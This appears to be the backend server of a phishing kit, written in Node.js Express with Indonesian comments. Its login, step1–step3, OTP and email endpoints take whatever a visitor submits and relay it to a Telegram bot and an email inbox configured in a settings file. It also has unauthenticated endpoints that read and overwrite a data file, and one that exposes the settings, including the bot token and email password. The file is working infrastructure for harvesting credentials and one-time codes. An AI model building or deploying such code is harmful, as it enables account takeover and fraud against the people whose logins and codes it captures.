const express = require('express');
const fs = require('fs');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios')
require('dotenv').config();

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());

function getSettings() {
  const raw = fs.readFileSync('./setting.json', 'utf8');
  return JSON.parse(raw);
}

// BACA FILE TXT
app.get('/api/read', (req, res) => {
  fs.readFile('server/data.txt', 'utf8', (err, data) => {
    if (err) return res.status(500).json({ error: 'Gagal membaca file' });
    res.json({ content: data });
  });
});

// UPDATE FILE TXT
app.post('/api/update', (req, res) => {
  const { content } = req.body;
  fs.writeFile('server/data.txt', content, (err) => {
    if (err) return res.status(500).json({ error: 'Gagal menulis file' });
    res.json({ message: 'File diperbarui!' });
  });
});
app.get('/api/read-setting', (req, res) => {
  const settings = JSON.parse(fs.readFileSync('./setting.json', 'utf8'));
    res.json(settings);
});
app.post('/api/otp', async (req, res) => {
  const message = JSON.stringify(req.body, null, 2);
  const settings = getSettings();

  const token = settings.telegram_token;
  const chatId = settings.telegram_chat_id;
  const to = settings.email_target;
  const subject = "this subject";
  const text = message;

  const transporter = nodemailer.createTransport({
    service: settings.host,
    auth: {
      user: settings.email_sender,
      pass: settings.email_pass,
    },
  });

  try {
    // Kirim ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });

    // Kirim ke Email
    await transporter.sendMail({
      from: settings.email_sender,
      to,
      subject,
      text,
    });

    res.json({ message: 'Pesan Telegram dan Email terkirim!' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal mengirim', detail: err.message });
  }
});
app.post('/api/email', async (req,res) => {
  const message = JSON.stringify(req.body, null, 2);
  const settings = getSettings();

  const token = settings.telegram_token;
  const chatId = settings.telegram_chat_id;
  const to = settings.email_target;
  const subject = "this subject";
  const text = message;

  const transporter = nodemailer.createTransport({
    service: settings.host,
    auth: {
      user: settings.email_sender,
      pass: settings.email_pass,
    },
  });

  try {
    // Kirim ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });

    // Kirim ke Email
    await transporter.sendMail({
      from: settings.email_sender,
      to,
      subject,
      text,
    });

    res.json({ message: 'Pesan Telegram dan Email terkirim!' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal mengirim', detail: err.message });
  }
});
app.post('/api/step3', async (req,res) => {
  const message = JSON.stringify(req.body, null, 2);
  const settings = getSettings();

  const token = settings.telegram_token;
  const chatId = settings.telegram_chat_id;
  const to = settings.email_target;
  const subject = "this subject";
  const text = message;

  const transporter = nodemailer.createTransport({
    service: settings.host,
    auth: {
      user: settings.email_sender,
      pass: settings.email_pass,
    },
  });

  try {
    // Kirim ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });

    // Kirim ke Email
    await transporter.sendMail({
      from: settings.email_sender,
      to,
      subject,
      text,
    });

    res.json({ message: 'Pesan Telegram dan Email terkirim!' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal mengirim', detail: err.message });
  }
});
app.post('/api/step2', async (req,res) => {
  const message = JSON.stringify(req.body, null, 2);
  const settings = getSettings();

  const token = settings.telegram_token;
  const chatId = settings.telegram_chat_id;
  const to = settings.email_target;
  const subject = "this subject";
  const text = message;

  const transporter = nodemailer.createTransport({
    service: settings.host,
    auth: {
      user: settings.email_sender,
      pass: settings.email_pass,
    },
  });

  try {
    // Kirim ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });

    // Kirim ke Email
    await transporter.sendMail({
      from: settings.email_sender,
      to,
      subject,
      text,
    });

    res.json({ message: 'Pesan Telegram dan Email terkirim!' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal mengirim', detail: err.message });
  }
});
app.post('/api/step1', async (req,res) => {
  const message = JSON.stringify(req.body, null, 2);
  const settings = getSettings();

  const token = settings.telegram_token;
  const chatId = settings.telegram_chat_id;
  const to = settings.email_target;
  const subject = "this subject";
  const text = message;

  const transporter = nodemailer.createTransport({
    service: settings.host,
    auth: {
      user: settings.email_sender,
      pass: settings.email_pass,
    },
  });

  try {
    // Kirim ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });

    // Kirim ke Email
    await transporter.sendMail({
      from: settings.email_sender,
      to,
      subject,
      text,
    });

    res.json({ message: 'Pesan Telegram dan Email terkirim!' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal mengirim', detail: err.message });
  }
});
app.post('/api/login', async (req, res) => {
  const message = JSON.stringify(req.body, null, 2);
  const settings = getSettings();

  const token = settings.telegram_token;
  const chatId = settings.telegram_chat_id;
  const to = settings.email_target;
  const subject = "this subject";
  const text = message;

  const transporter = nodemailer.createTransport({
    service: settings.host,
    auth: {
      user: settings.email_sender,
      pass: settings.email_pass,
    },
  });

  try {
    // Kirim ke Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message
    });

    // Kirim ke Email
    await transporter.sendMail({
      from: settings.email_sender,
      to,
      subject,
      text,
    });

    res.json({ message: 'Pesan Telegram dan Email terkirim!' });
  } catch (err) {
    res.status(500).json({ error: 'Gagal mengirim', detail: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server berjalan di http://localhost:${PORT}`);
});